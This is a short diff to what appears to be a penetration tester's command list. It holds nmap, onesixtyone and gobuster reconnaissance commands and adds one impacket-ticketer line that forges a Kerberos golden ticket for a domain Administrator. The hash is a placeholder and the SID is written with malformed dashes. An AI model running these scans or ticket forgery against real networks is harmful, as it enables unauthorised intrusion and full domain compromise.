@@ -1,4 +1,5 @@
 sudo nmap -T4 -Pn -sS --top-ports 20 -oA nmap_$(IP) $(IP)/24
+impacket-ticketer -nthash 0f5assasa6f -domain-sid S-1–5–21–2986980474–46765180–2505414123 -domain 'domain.local' Administrator
 onesixtyone $(IP) -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
 gobuster dir -u http://$(IP)/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_dir_$(IP).txt
 gobuster dns -d $(IP) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o gobuster_dns_$(IP).txt
